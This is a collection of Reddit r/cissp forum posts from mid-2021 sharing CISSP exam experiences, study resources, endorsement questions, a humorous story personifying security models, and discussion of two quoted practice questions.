They were not as obvious as the practice tests. I was able to narrow questions down to 2 answers. I took too much time in the beginning 50q and didn't have enough time for the rest of the test. Ended up rushing the last bit. 

Knew i failed when the last few questions were straight forward and much easier. Got a lot of legal and regulatory questions that i didn't know because glossed over those in my studies.

Study materials: 
Shon harris all in one CISSP (mostly used to do practice tests. Did ~700q)

11th hour

Sybex 3rd edition practice tests (did ~200 questions. Bought too late in July) 

Destination mind map videos (watched each vid 2x + took notes) 

Cissp cram series (watched each video 2x + followed slides)

More practice questions. Want to do all the questions i have

Look for an audio book version of a prep book

681,ouob9r,Provisionally Passed Yesterday @ 150 Questions,"Hello all. I have been quietly following the CISSP reddit thread for the past two years. Before I get into the journey, I will tell you about my background. I have been in the IT industry for 15 years wearing many hats along the way. I was a managed services network engineer for most of it, although I also worked on systems and security in these roles. I was also an ISO/IT Manager for about four years in the financial industry. I am currently working as a network engineer in the media and broadcast industry. I currently hold CCNP r/S, MCSA/MCSE 2016, A+, Network+ and CISM.

&#x200B;

I have been studying for the CISSP off and on for the last two years. I was hoping to test in early 2020, but the testing centers closed for a while due to COVID. I studied the official study guide (read it cover to cover) and finished the 11th hour by Eric Conrad. This took about two weeks. I tried to read the Shon Harris edition, but I wasn't captivated by the writing style. It felt like reading a dictionary. The official guide was still a hard read, but I was able to keep up with the progression. I also used several practice tests including: the official practice tests, Boson, Shon Harris practice questions and PocketPrep. I would test myself on random questions and when I did poorly, I would review chapter material or concepts.

&#x200B;

After I learned that ISACA allowed online testing, I scheduled my CISM test for May of 2020. Unfortunately, I had technical issues logging into the exam environment so I was not able to take the test. Support did issue me a voucher to retake the exam, but I did not end up taking the exam until April 2021. Not wanting my voucher to expire, I studied the All-In-One study book for the CISM and used the QAE question bank to help (re)prepare. I thought both were essential for passing the CISM exam. I was able to pass the CISM when I took it in April 2021; thankfully I had no technical issues this time. The proctor had me scan the room, under the desk, etc. to ensure a secure test environment at home. It took about two weeks to have my work experience approved, maintenance fees, etc. until I was finally CISM certified.

&#x200B;

I told my employer about my new credentials and my interest in cybersecurity management. They requested I take the CISSP as it was viewed as a harder tested (I'll comment on that later). I ordered the ninth edition of the Official study guide and started my studies with a focused approach on my weak domains. I continued to use my practice tests to focus on these areas. I used PocketPrep and Boson for most of it. When I started using Boson, I was averaging 60-70%. After two months of studying, I was able to bring that up to 80-90% on average. I bought the CCCure questions, but only used them a few times. I heard on this forum that Boson was the best and I agree with that. I finally decided to schedule a date and get it done. I picked 7/29 as my test date and I was a nervous wreck leading up to the exam date. I felt I understudied, unprepared, etc. even though I have been studying hard for the last several months. I read the 11th hour book cover to cover to brush up on my topics. I read this until the late morning on the day of my test. My test was at 2 PM. I also watched the Kelly (Why you will pass the CISSP) video and Larry's videos and they will essential for gaining the right mindset. DON'T FIX ANYTHING!!! Cost benefit analysis for each solution. Management answers are always applicable. Focus on human life.

&#x200B;

I did a few Boson practice questions in the parking to get into the mindset of reading the questions slowly (once, twice), reading the answers slowly (once, twice). All the time to think like a manager, not an engineer. My heart rate was up and I was stressing out. I finally made my way into the testing center for the moment of truth. After the palm scans, NDA and all the processing, I finally started the exam. What I read on this forum was accurate. These were like no questions I have ever seen in my practice test bank. I had a handful that were like that, but most were scenario based. You have to completely understand the concepts and when to use them. I would read the question two or three times, figure out what they were asking and then select the appropriate or best answer. I also proved the other answers were incorrect or less accurate than the answer I chose. Several questions were way out of left field and I used an educated guess to eliminate the wrong answers. After going past 100 questions, I really thought I was headed for failure. I was thinking, all that studying and it is still not enough. I even visualized my next steps, like attending a boot camp. Nevertheless, I continued to answer each question as if it would make or break my passing grade. I finally got to question 150 with about an hour left and clicked finish exam. I was surprised it didn't have a survey like the other exams I have taken.

&#x200B;

I had to go through the checkout process (ID and palm scans again). The proctor verified my name on the printout and I noticed when she was holding it, it did not have bar graphs like I heard similar to a failure report. When she handed it to me, I saw ""Congratulations"" and said aloud, ""Well I wasn't expecting that."" haha I'm so glad I stuck with it and continued to fight for the win. I feel the networking questions pushed me over the top since that is my strongest area. I know I didn't ace it at 100 questions, but I tried my best and that is all that mattered to me. I look forward to the future this certification will bring. If anyone has tips on staying on top of the CE's, I would greatly appreciate it.

&#x200B;

I feel the CISM will help prepare you for the CISSP, but while they are similar, they are also very different. The CISM is more management focused without the high level technical knowledge required for the CISSP. Both exams were very challenging. CISM is paramount if you plan to pursue a Infosec Manager role and analyzing/reporting risk to C-level executives. There is a lot of overlap between the two, but studying for one doesn't necessarily prepare you for the other without additional study.

&#x200B;

Whatever your journey may be, I wish you all the best and I'm happy to answer any questions that do no break the NDA.

682,ounoel,Anyone practicing with Thor Pedersen's HARD CISSP Practice Questions?,"So my company offers Udemy for Business subscriptions. Through this I have been able to obtain some CISSP resources. Some of the available resources are Thor Pederen's HARD CISSP Practice Questions. So far these are the trickiest and most confusing practice questions I have come across during my prep. Sometimes I feel like they are purposely trying to trick me by using specific words which start to make me over think. I was wondering if anyone else has been using these and if they are also finding them confusing and also wondering how similar these will be to the actual questions I will see. I have provided a sample below.

 ""J**ohn is creating a username for a new employee, Frank Hornsby. The company guidelines recommend the username ""hornsbp1"". The new employee has requested the username ""cowboy"", and there are no accounts with that name. Which username is John most likely to create, and what is the BEST reason?** ""

a. Cowboys because guidelines are optional and cowboy is unique 

b. hornsbpi, because cowboy would be too conspicuous and may attract attackers

c.  hornsbpi, because this format follows the guidelines

d. cowboyl, because this almost follows the guidelines and would not be too conspicuous

I have no factual background in IT or cybersecurity (I did get SEC+ in March). I’m an active duty Soldier who’s about to retire, and my specialty is in tactical radios and COMSEC. What probably helped me out the most was that I’d been a “manager” for almost 18 years. I do have pretty good knowledge of symmetric and asymmetric keys as a COMSEC manager, but that’s been my experience for the past 20 years.

I passed on my first attempt at 150 questions. I made sure to read everything super slow, and I took the entire three hours.

I used a ton of sources to make up for my experience and lack of knowledge.

Sources I used:

Study Notes and Theory - best overall source for content. The website and Facebook group are phenomenal. 

How to Think Like a Manager by Luke Ahmed - the 25 questions helped me with the manager mindset. Excellent!

Mike Chapple’s LinkedIn course - does a great job of delivering content, then applying it to real-world scenarios 

Sybex 8th & 9th editions 
Sybex Official questions
Shon Harris AIO
Wentz Wu The Effective CISSP
11th-hour study guide
Cissprep.net questions
Destination Certification videos by Rob Witcher
Kelly Handerhan videos
Prabh Nair’s YouTube videos

I used the Pomodoro method for my study routine.

I also used Anki a lot and this subReddit group.

The Sybex content prepared me for the technical part of the exam, the questions on Study Notes and Theory as well as How to Think Like a Manager and CISSPrep.net prepared me for the manager mindset. Mike Chapple’s LinkedIn CISSP class put everything together for me.

Those were my top three resources! But I needed all of them to pass!

I didn't find the exam super hard. It was tough, but I felt prepared the best I could have been!

Finish Other 3 Practice Exams?,"Have begun my CISSP studying, I just finished reading the OSG 9E over just about exactly 3 weeks from start to finish (Chapter a night average basically). A lot of the concepts were familiar as I wear a lot of hats at work (endpoint security, penetration testing, vulnerability management, application security, config management), but no management experience (technically still in a junior role, but manage all of the above more or less, yeah I know...time to move on up elsewhere).

I have just over 3 years experience overall, all in InfoSec right out of a Masters in CS (non-technical undergrad), so planning to take CISSP exam right around 4 year experience mark so I can officially get endorsed.

I'm guessing 86 on Practice Test is a good sign obviously, as I cover many domains in my day to day, and know where my weaknesses lie. But of course these aren't like the real questions...

Should I finish out these other 3 Practice Exams and see how I do? I don't wan't to exhaust my resources, since once you take a practice exam, that test is not a good gauge anymore since you know the questions.

How near to passing is ‘near proficiency’ 

I just wish they gave me a little more breakdown of how close I was exactly. I have been studying for the past 6 weeks( min. 4 hours a day) one week was a boot camp.

My organization paid for an ISC(2) bootcamp and I had a fantastic instructor who provided excellent examples of ""demystifying"" complex subjects like encryption algorithms and frameworks.  I attended the bootcamp last week.

I only used the book as referenced by my bootcamp instructor and then occasionally during the ISC(2) official practice exams to review information that I missed.  I didn't read it cover-to-cover.

I also paid for a month subscription to the PocketPrep app to gain access to all of the questions and just hammered practice questions at night between my bootcamp last week and my exam this morning.

It stopped me at 100q after about 100 minutes.

I think experience had the biggest role in me passing.  I've done most everything covered by the domains, but there's also definitely a ""mindset"" that you have to put yourself in when you take the exam.  It was the same for the CISM.

697,otq9aj,About a question from the Wiley CISSP test bank...,"Greetings everyone. I attempted the Bonus Exam from Wiley's Test Bank today, and one of the questions asked about a packet analysis scenario.

The questions goes like this:

>While performing network packet capture analysis, you discover packets that seem odd. By looking into the packet’s raw hex display, you see that the byte offset position 0x2F has the value of 0x08. What was this packet attempting to make occur?  
>  
>A. Abruptly disconnect a session  
>  
>B. Confirm the receipt of a data set  
>  
>C. Start a graceful hang-up process  
>  
>D. Initiate a new session connection

I pick A, the answer that this shows a reset, to abruptly end the connection, and Wiley says I'm right. It provides the following explanation which I'll copy and paste here:

>The raw hex value of 0x08 in offset position 0x2F represents the binary number of 00000100. When this binary number is compared to the TCP header flag (i.e., the offset position 0x2F) layout of XXUAPRSF, it is clear the Reset flag is set. Thus, this packet is attempting to abruptly disconnect a session.

This seems strange, because 0x08 is binary 00001000, so the explanation is one position off.

The layout of the control bits is correct, XXUAPRSF, and RST is indeed 00000100. But, that means the hex value should be 0x04 in both the question *and* the answer / explanation.

Furthermore, the offset position for the TCP header flag should be byte offset 13, i.e. TCP\[13\]. Why does it say offset position 0x2F?

It seems as if Wiley made several mistakes here. Either that, or I am losing my mind. Can you guys weigh in?

One last point is that I hardly think questions like this will appear in the actual exam. Packet analysis seems too far down in the weeds. What do you guys think?",2021-07-29

The story may sound silly because I am just making this shit up, also my grammar sucks so please excuse me but I will write in a way so that each model is memorable :)

If you all like this, I can write more about other topics, so here goes nothing!

\-------------------------------------

It was a cold winter night in Virginia but it was hotter than ever in Washington DC with cybersecurity incidents across the Federal government. Something had to be done or else the USA was to going to lose the war against its enemies on the cybers fronts. We could beat anyone in physical battle, but how do we beat an enemy who knows no boundaries that you can't shoot or kill by a stealth bomber or a drone?

After being in traffic for hours on 66 East by the Key Bridge near Georgetown, Mr. Bell LaPadula had enough and took the exit near Roslyn to cross the bridge. ""Big mistake"" he explained ""the damn traffic worse up in here!"" After moving an inch every 30 minutes, he remembered why took this exit. He loved the view of the Potomak river, as the sun rose up over Kenndy Center. It was better than looking at a parking lot of cars.

Noticing how late he was running for work, he had no choice but to call his best friend Biba, a goofball who saw Mr. LaPadulla as this big military prick but loved like a brother nonetheless. They have been arguing for days about how to solve these Cybersecurity incidents. His biggest worry was to prevent insider threats, there has been a fear that there are Chinese spies now working in the ranks of the US government, they had found a way to get in and now no one could be trusted, not even our own...

Bell and Biba have been working together with Clark Wilson, an AirForce retire who loved sports cars, more especially Camaros, and their nerdy twin buddies Brewer and Nash who were obsessed with the Great Wall of China, but for some odd reason they always referred to it as Chinese Wall, LaPadulla never asked why... Together they made a great team solving the hardest IT Security problems.

However, Mr. Goguen Mesegur, a kiss-ass who was a title whore in the government world, always got in the way of LaPadulla. No matter how great of an idea he had, Goguen stopped him in order to push his own agenda. His biggest supports were Graham Denning, an IT Manager, and Mrs. Sutherland, an old-school mean lady who smoked way too many cigarettes, the type of person you wondered how she was still alive after smoking packets of cigarettes per day for many many years! If she called, you could even smell the cigarettes from the phone as soon as she said ""hello darling...""

703,osz1a8,Provisionally passed the CISSP at 100 questions today,"Hello everyone,

&#x200B;

I studied for the exam for maybe 2 days and did a cramming session last night of some quizlet questions, read through eric conrad's 11th hour, reviewed concepts in the official study guide I didn't understand, watched youtube videos, and provisionally passed the exam at 100 questions. Let me start off by saying that I have about 10+ years of experience in InfoSec and most of the success of the exam was really not from the cramming session, but rather my real-world experience. 

&#x200B;

This was by far the weirdest exam I have ever taken. At no time, did I know or feel if I was doing well or not. The questions are worded in a way that many answers could be correct ones and I feel that this is what makes the test **'difficult'** for some. There were a lot of test-taking skills that I applied like the process of elimination and re-reading the question again to ensure I was understanding the question correctly. At the end of the day, I believe my experience and knowledge of infosec acquired over the years is what got me the pass.

&#x200B;

I just want to say you definitely don't want to memorize anything. The cramming session I did overnight was focused on a couple of areas I didn't feel comfortable with and I really just tried learning the concepts. Memorizing will definitely not help you in this test. Definitely need to understand concepts and take the test from the perspective of a 'Risk Consultant'. That really helped me.

&#x200B;

Anyways, I'm happy that I was able to pass and I'm also very thankful for the posts with resources people used to pass the exam that I was able to review the past month. I did use some. 

&#x200B;

Here's my list of resources that I used this week:

\- Eric Conrad's 11th Hour **( Read book overnight and today before exam, its a super quick read and very helpful)**

704,oswpx3,CISSP endorsement questions,"I'm currently studying for my CISSP and have some questions about who can actually endorse me.

I thought I just needed to prove 5 years of experience in the domains covered, I didn't realize that the person endorsing me has to also be ISC certified.

I am part of a two man IT team and would've had my boss endorse me. the scope of my job very much includes security.

However, while I have 5 years of security experience, my boss is not an ISC member. I'm also not particularly looking to jump ship once I'm certified (though id make a lot more money if I did.) How do I get my skills endorsed when I pass the CISSP exam?

Can my boss endorse me without a CISSP himself?

Can I be endorsed by a third party ISC2 member? If so, what will I need to show them to prove my experience?

For example, in the past five years I have:

- earned a CRTP certification

- built and tuned a SIEM solution based on graylog, elasticbeats, sysmon, and graylog sidecar. This system uses SIEM rules translated from the sigma project (to which I am a github contributor)

- developed the incident response plans and playbooks for our organization (a few hundred pages worth)

- planned and implemented CCTV and access control systems for all of our sites...

- ... along with matching surveillance and privacy policies specific to our region (were a govt agency subject to strict privacy laws)

- top 500 member of hackthebox.eu since 2017

- set up and perform monthly vulnerability assessments

- replaced all our firewalls and audited their rules and configurations

- wrote the RFPs for several new projects (including disaster recovery)

- been the primary responder to several ransomware incidents (at my previous job at an MSP)

- Developed security awareness programs for our staff (both knowbe4 and live demos such as demonstrating USB HID attacks to staff)

- formally specialized in infosec during my computer science degree

- write infosec articles in my spare time, several of which have been cited by large organizations including infosecinstitute (not that i like infosecinstitute, but whatever)",2021-07-27

710,orz3bf,5 Tips For Passing The CISSP Exam,"Thought I’d share some of my top tips for passing the CISSP exam.

**#5 Read and Relate**

“I don’t understand, I read the Shon Harris book 3 times! How did I fail the exam?”

You read The Odyssey.

You read The Old Man and The Sea.

You read To Kill A Mockingbird.

You don’t read a CISSP study guide.  You must relate and understand a CISSP study guide.

Software Development Security was my weakest domain.  I’d turn my computer speakers up, and listen to a 2-hour video about Software Development Security on YouTube or CBT Nuggets.  Then, I’d proceed to forget everything in three days.  I don’t create software for a living, which is why I had a tough time relating the Software Development Life Cycle (SDLC) to the real world.

But I did work in network security for a living.  A job in which I applied cryptography concepts into action through the use of VPNs and SSH every single day.  This is why cryptography became my strongest domain, I had the ability to relate what I read in CISSP study guides.  I’d read about symmetric and asymmetric encryption, and then apply it for customer devices and environments.  It was awesome.

In an effort to increase my knowledge about the SDLC though, I Googled and YouTubed all I could.  I’d Google things like “iphone software development process”, or “SDLC process used by Facebook”.  I’d read about these real world examples to better relate it to the CISSP books.

I found out too late that the CISSP is actually not a memorization test, it’s a test of concepts.  Keep that in mind as you study!

If you want to be a good basketball player, you gotta put in hours shooting in the gym, learning how to dribble tighter, run faster, and shoot more accurately.  Michael Jordan obsessed over the game, and went on to become a basketball legend, and accumulate an estimated net worth of $1 BILLION!

Michael Jordan was the totality of all his training.

I remember obsessing so much over the CISSP that sometimes I neglected my friends, family, and general hygiene.  When obsessing, it’s hard to let go.   While driving, going to sleep, or eating, my obsessive subconscious would still think of a problem, and continue to work on it.

Obsession can be dangerous mentally, but with proper control, it can be an effective productivity tool.

Luckily, you can start the obsession phase 2 months before you take the actual exam.  This is the time to sleep, breathe, and eat CISSP.  Just study it everyday right up until the exam so everything stays fresh in your brain.

**#3 Write**

Not type. Not email.  Not text.

Write.

Pencil and paper.

Read about vulnerability testing, and then draw out a network topology map and place the firewalls, IPS, IDS, and servers where they should belong.

Read about system ring architecture, and actually sketch the proper and secure path for a system process.

Read about the OSI Model and actually draw out how a packet starts at the application layer on Host A, and travels up the layer to Host B.

Let the information you read, flow from your brain, through your arms, and to the tip of your pencil.  When you get a question about a packet having issues at the network layer on the exam, your brain will recall back to your hand motion of writing about it on a piece of paper.

**#2 Trust Yourself**

Before actually taking the exam, all I heard was that the CISSP was an incredibly tough exam.  This was in the days of the 250 questions and 6 hours of total mess-with-your-mind torture exam.

This is true.  But I’m here to tell you that it is a completely passable exam! It’s not that difficult.  The only way to do it is to follow the same formula as everyone else who has passed.  Get some real life security experience, study the Shon Harris books, take an ungodly amount of practice exam questions, and mentally prepare yourself to sit in an exam room for a prolonged period of time while being mentally tested.

After completing about 180 questions during the exam, I actually started to feel fairly confident that I will pass.  Before taking the exam, I felt 60% confident that I’d pass, even though I studied for 10 months.  It is only after passing, that I realized I should’ve trusted myself 100%.

I’m trying to boost your confidence now, and not after the exam.  If you study well, you will be a CISSP.  It is not that difficult.

If you understand the concepts, and can truly see the big picture as it relates to information security, and have done your best to study for the exam, then trust yourself.  You will pass.

**#1 Don’t Give Up**

The alarm rings at 8:00 a.m., but it’s your day off.

You came home from a tough week of work, spent time with your family trying to hide your exhaustion, then finally collapsing into bed.

You deserve some rest.

Then your brains reminds you about that alarm you set early in the morning.  You still have an exam to take in 5 weeks.  You may have failed it the first time, but you’re definitely not going to fail it the second time.  You still have to read more about Common Criteria and Spanning Tree Protocol.  You still need to nail down all the steps in a forensic investigation process.

I can tell you not to give up a million times.  I can tell you that dedicating yourself to study for the CISSP is the only way to pass the first time, but it’s ultimately your decision.

Don’t give up.",2021-07-26

Where-ever I see, read - on youtube, blogs, forums - there is a lot of fear mongering around the exam. The same kind as we had during high school exams, college exams, university exams and the freshers company placements exams. What happened - we did not learn anything by choice but by fear. What such fear mongering does is lowers our morale and we start considering this exam as our worth decider. 

I am just writing this post - to give a perspective - that this is just an exam! And especially designed for professionals - who work 8-10 hours a day, have other Misc. work, life crisis, relationships and in summary are adults with a whole lot of responsibilities. 

If you read this post, do study for the exam at your own pace, give your own best (don't read others opinion how tough the exam is) and then in the end it is just a result (Pass or Fail). No exam can value the minimum of 5 years of experience we all have in the Information Security Field. 

The exam is worth it for sure, to learn and test our knowledge but the kind of fearful stature we give to this exam should be stopped - we are adults and not students. We have experienced life and we know it will be Okay!

714,or002m,Obligatory “provisionally passed” post,"Full disclosure: I earned a CISSP cert around 2003-04 that I held for 6 years and then let lapse. I wasn’t in a security-focused role in the job I’ve held for the last 16 years, and keeping up the CEUs wasn’t worth it. That being said, the CBK and the exam - as well as the industry in general - are radically different than they were then and I’ve never been in a “traditional” security role. My earlier test was the 6 hour paper exam on 10 domains that had very little overlap unlike the current 8. 

Prep: 1 month, OSG 8th edition, sample test companion book, ITPro.tv subscription (accelerated 2018 version, 2021 came out just before my test), mind map and exam cram YouTube series. I also credit Harry Lorayne and Josh Foer for the memory techniques that I made extensive use of in my studies.

If I had to prep over again I would’ve done the mind map series first before starting ITProTV and OSG. It would’ve given me a better 360 and a place to hang the specific concepts as I picked up more detail.

The adaptive testing is no joke. I honestly had no idea how well I was doing, or whether I was going to pass or fail when I got my results. I had no idea which questions were evaluated, and TBH was often not sure whether I knew the answer or not. I would have probably dreaded my results and felt like giving up if I hadn’t seen [this video](https://youtu.be/5nqqL1rjIY4). If you’re used to acing paper exams this will feel awful. I had to remind myself many times not to take ANYTHING too harshly in my mind.

I was shocked when the exam stopped at 100 questions. Didn’t note my final time but it was right around an hour.

Top advice, spend as much time as you can in the [Certification Station](https://discord.gg/certstation) Discord channel. There you will find both what's the proper material, and relevant and authoritative discussions about the different topics.

I've compiled which sources I used in this [LinkedIn post](https://www.linkedin.com/posts/lucianovaschetti_today-i-defeated-the-beast-after-100-activity-6823330484798423040-ox-X)

&#x200B;

Although it's a Manager exam, it evaluates technical content, so you have to be comfortable with the vocabulary and how the technology works. That said, technology is not the most important to be evaluated.

As I've been told, there are really weird questions (although related, of course)

New topics come up, but being aware of them and knowing the inch deep is enough.

It's not worth memorizing anything (and I didn't), but understanding and being able to talk about the major processes (BCP, BIA, DRP, IR, SDLC)

Time wasn't an issue with the exam. On the contrary, 100 minutes were left, even without rushing into any question. Taking a few breaks to go to the bathroom and drinking water was really helpful.

The last days I relaxed and took walks while listening to Rob Witcher's mindmaps, and listening to different mindset videos on Youtube (Kelly, Larry, Seth Misenar / Eric Conrad)

&#x200B;

These videos helped me a lot, to be in the ""Think like a Manager"" mindset, I watched them several times:

[https://www.youtube.com/watch?v=v2Y6Zog8h2A](https://www.youtube.com/watch?v=v2Y6Zog8h2A)

[https://www.youtube.com/watch?v=dq5eodSz\_0k](https://www.youtube.com/watch?v=dq5eodSz_0k)

&#x200B;

Something really helpful was to print the Exam Essentials from OSG 9, and reviewed them all, marking and putting comments to anything I wasn't sure about.

So, covering 100% of the topics (without memorizing anything like cable speeds) + a good mindset = being comfortable at the exam room.

Also, before entering the exam room, I took 5 minutes for myself and breathed with my eyes closed, listening to this one: [https://www.youtube.com/watch?v=AtF0T2fPvbI](https://www.youtube.com/watch?v=AtF0T2fPvbI)

&#x200B;

As for the questions in the exam:

\- Some of them were really direct /easy/straightforward (e.g. ""what's best for accomplishing ***this***). These ones would be like Boson.

\- Some of them were hard, in the sense that the purpose was hidden (they used other words different than the ones we're used to (e.g: Privacy instead of Confidentiality). These ones would be like Thor's

\- Some of them were really weird (assume most of that ones were non-graded) and I'd tried my best. These ones would be like Wentz's

I think there were 1/3 of each of those groups. Really, some of them weren't that hard

But.. for the first group, I had a (simple) networking question, or access control model questions, that if I didn't know the knowledge couldn't have answered.

721,opmbh7,"Provisionally Passed 100 Questions, 2 Hours","It seems customary to post a pass here, and since others' success stories have inspired mine, thought I would give my 2 cents as well.

I would consider myself one of the less experienced coming into the exam, am currently a post-graduate student finishing up Masters in 4 months, and zero work experience outside of an internship. 

Started 4 weeks ago using the following:

**Study Materials**

* [Sunflower CISSP Summary](https://docs.wixstatic.com/ugd/dc6afa_fc8dba86e57a4f3cb9aaf66aff6f9d22.pdf) by Maarten de Frankrijker
* CISSP Exam Cram by [Inside Cloud and Security](https://www.youtube.com/channel/UCAr0yk0um7lwLjmrKfzwyig)
* [Destination Certification](https://www.youtube.com/channel/UCXk6whiDrWq42y9Tdv1MEhg) summary videos
* Google

CISSP Exam Cram came first, and after finishing all 8 domains and doing a few questions, I watched Destination Certification videos as a refresher. Sunflower CISSP Summary was mostly used as reference material, alongside Google.

**Practice**

* CISSPrep

Comparing the style, CISSPrep questions were very similar to the questions I got during the certification tests. Its pretty affordable as well. Some questions there are worded poorly, or have bugged options (especially for the drag and drop, somehow it doesn't record your selections properly), and some questions that I got wrong were not very well explained by them. However, it did a proper job in training me to focus on what's important when reading and answering questions (think like a manager).

I would say that results for practice tests don't really matter (unless you're getting below 40-50%), what's important is what you get from it. I was scoring 60-65% on the CISSPrep mock exams the day before the test.

**Pre-Test/Pre-Practice**

*  [Why you will pass the CISSP](https://www.youtube.com/watch?v=v2Y6Zog8h2A) by Kelly Handerhan

Having little work experience, these 2 videos were vital in getting me into the correct mindset when doing practice questions, and sitting for the test. Watch them once before doing practice tests, and as many times as you want before you sit for the test, I feel it really helps.

**The Test**

It wasn't as hard as I expected it to be. Questions were pretty clear in explaining scenarios, just make sure to read carefully and read all the options. Many times I changed my answer at the last minute after realizing I read the question/options wrong or too quickly.

It was a wild 4 weeks for me with many lows, and not many highs, and I wish whoever who is preparing for their upcoming test all the best. Make sure to get enough rest the day before, and eat well (but not too well) to last the entire duration of the test.",2021-07-22
722,opked7,CISSP Experience,"This forum helped me quite a bit and hence thought to update my experience for the benefit of the community and offer credit to the immense learning resources on the web

About me: Over 10 years in IT / Risk / Cyber.  

**Prep:** About 3 months, initially about 1 hour / day followed by 3-5 hours of revision in the last 2 weeks.

The following resources help strengthen my concepts (A big thanks to all of them):

· Thor Teaches

· Kelly videos

· Official study guide and practice questions

· CISSP mind maps on YouTube ([https://www.youtube.com/watch?v=6X4A6B94vmw&t=101s](https://www.youtube.com/watch?v=6X4A6B94vmw&t=101s))

· Reddit and ISC forum

· Reviewed the ISC practice questions once but did not attempt any more practice exams since I ran out of time. 

**Exam experience:**

Like most of the commentators before me mentioned, the questions were not straight forward, and I had no clue if the answer was correct. In fact, I tried looking up the answers to some of the questions I recalled at home but struggled even with Google! Some domains had more questions than others. I planned to take a break after 100 questions, but the exam ended on the 100th question with 1hour to spare. I did not look at my transcript until I was out of the centre  and was pleased to have provisionally passed. 

**Top Tips:**

Read the question and identity key words such as “Which solution”, “What comes first” etc. This should help filter out some of the answers. 

There is a lot of material out there and found additional value in each of them. Since the scope of CISSP is huge you will need to refer multiple sources.

If I had to prepare again, I would try to cover as many topics as possible and answer the following question with 1-line answers. What, Why and How. I don’t think it is necessary to go in depth and unnecessary details. Focus on concepts and understand why some of the technologies actually exist, their vulnerabilities and remediation. Use practice tests to re-in force these concepts and not as a barometer of your performance in the exam.

I don't say this as bragging, but as a touch-point so others might have a guide of ""what's enough"" and ""what's *too* much."" Also looking back on my journey is through the lens of what I know now, I might be overly critical of some resources. *To that end* I may be over-critical of some resources as not being helpful, but as it's difficult to divorce my viewpoints from my perspective to that end, I'll just give you as honest-as-possible evaluation of what I used.

My main takeaway is: The most productive parts of my journey were a tight feedback loop of practice exams, identifying weak points, studying, and repeat. 

# Before CISSP

I have \~9 years of IT/technical experience, 4+ of which was a wide-spread role containing cybersecurity, IR, limited forensics, DLP, and security tool administration. The last 9-10 months have been as a Cloud Security Architect. All of this has been at the same organization, a Fortune 100 enterprise.

Previously I've obtained the following certifications that the studying of helped (at least in part) for the CISSP:

* Security+
* SANS GCIH
* CEH (Masters)
* Cloud+
* AWS Certified Cloud Practitioner
* AZ-900
* AZ-104

In addition I took the OSCP class, and worked some of the labs, but did not attempt the exam. Retaking the class and reattempting the exam is a 2022 or 2023 goal for me.

# Studying for the CISSP

I began with the 11th hour. I guess it was nice, but it felt way too high level. I know a lot of people say this is a great last-minute prep, but I really can't agree with that. It was so high level and detail-lacking I can't really see the value. I guess it was a nice first pass? In hindsight, the [CISSP Mindmap video](https://www.youtube.com/playlist?list=PLZKdGEfEyJhKWyryIvx_jm1jn6ZMTi7gW) series would have been a much better first pass. Note, I didn't study the 11th hour, just read through it once.

I also listened through, twice (just because it was long-car-trip material) the [Essential CISSP by Phil Martin, Second Edition](https://www.amazon.com/Essential-CISSP-Exam-Guide-Knowledge/dp/B07JDJV47Z). I thought it did a decent job, and if you would like to study during car trips, it's the best audio book I found. I tried some others, but I wouldn't recommend them.

Next I went through a period of practice exam, official study guide, rinse, repeat. The first practice exam I took was the OSG's companion exam, then my three worst chapters in the OSG, then BOSON A, then the half-dozen worst chapters in the OSG (which did see some overlap), then BOSON B, the worst 3 chapters *and* the OSG's domain exams over the three worse domains, then BOSON C. I made notes along the way and reviewed the notes. I did all BOSON exams in ""study mode"" and if I missed the question I would screenshot the relevant parts of the explanation and added it to my study material. For the OSG practice exams, I would review the missed questions and also produce notes from them. All of my notes I went over at least twice, sometimes as many as six times. This being said by the time I had finished this, half of the OSG hadn't been touched, and I did not exhaust either the OSG practice exams (or close to it) or the BOSON exams. However the exams were different, so I would recommend both.

As a small aside, all of my study material was for the previous version of the CISSP. I did not feel like this left me ill prepared for the new version to any extent whatsoever.

Another small aside, I did watch a hodgepodge of videos on YouTube to focus in on any topic I felt uncomfortable with. My total time watching such videos was <6 hours, including repeating videos.

I also watched ""[Why you WILL pass the CISSP](https://youtu.be/-99b1YUFx0A)"" and read through [How To Think Like a Manager](https://www.amazon.com/Think-Like-Manager-CISSP-Exam/dp/1735085197/ref=sr_1_3?dchild=1&keywords=Think+like+a+manager&qid=1626967662&sr=8-3) during the weekend before my exam. I think they were both important, and added value. *However* I feel like the mindsets pushed in these study materials--*while valuable in the real world*\--weren't as important to the CISSP as they made it out to be. Still, do yourself a service and go through both of them.

Near the end of my preparations, I noticed I would read a practice question, and be able to *sometimes* articulate why two different answers were correct. Not in a ""these are both good answers, but I need to pick the best of the two,"" sort of way, but as a critique of the question author sort of way; I could display a deeper understanding that showed I understood the question; I was able to articulate an important security or business consideration that made it easy to justify multiple answers without more information. Thankfully on the actual exam I only came across one quesiton where I felt like I needed more information.

This level of understanding was probably the best sign I had that I was ready for the CISSP.

I was willing to accept if I picked a wrong answer in BOSON, the OSG exams, or Think Like a Manager, but about 1/3 - 1/5 of the time when I got a wrong answer I felt like I had a valid critique of the question, I would count myself as having gotten that question right. To that end, I was scoring about 85% on my last BOSON exam (first time taking the exam, I never repeated BOSON exams) and \~75% on my OSG ""trouble domains"" (domains where I was needing the most studying).

Lastly I will say please avoid the ""Inside Cloud and Security"" CISSP exam cram. I really hate saying this since his videos are engaging, clear, and generally well explained, however they suffer in three key ways. First what he decides to talk about feels like a patchwork of topics within the domain--or at least that's my view after having studied the domains--rather than a complete picture. Second, he often skips pass topics with a quick definition that really aren't valuable to you during the exam without actually understanding the topic, so it might give a false sense of readiness. Third, and most importantly, some things he says are outright wrong, which is dangerous for the exam. It felt like he got things that were more academic and less practical wrong, which makes sense given that he admits he did very little studying and depended on his extensive industry experience. 

# Final Thoughts/Summary

So the biggest reason I typed all of this up is to provide some context as to how to slam dunk the exam, and when you probably will slam dunk the exam. It also seems people are very hesitant in saying what % of practice exams will see that you pass, so here's my guide:

You're certainly ready to take the exam:

* When you're getting 80%+ on BOSON *from understanding the questions and not rote memorization.*
* When you're getting 75%+ on the OSG comprehensive exams *from understanding the questions and not rote memorization.*
* When you're getting 70%+ on the OSG domain-specific exams for your weakest trouble areas *from understanding the questions and not rote memorization.*
* After you go through the provided ""Think Like a Manager"" materials
* You have gone through all of the questions you missed, understand why you missed them, and spent time understanding accompanying material (if you miss a question about why a certain encryption technology is a bad choice in a specific situation, and another is a good choice, study both technologies in a broader sense, and loop in a third, forth, etc, technology that might be comparable)

This was where I was at, and, again, I was more than ready for the exam. Actually during the exam do basic good test taking skills such as ""carefully read the question, make sure you understand it, eliminate two answers,"" etc.

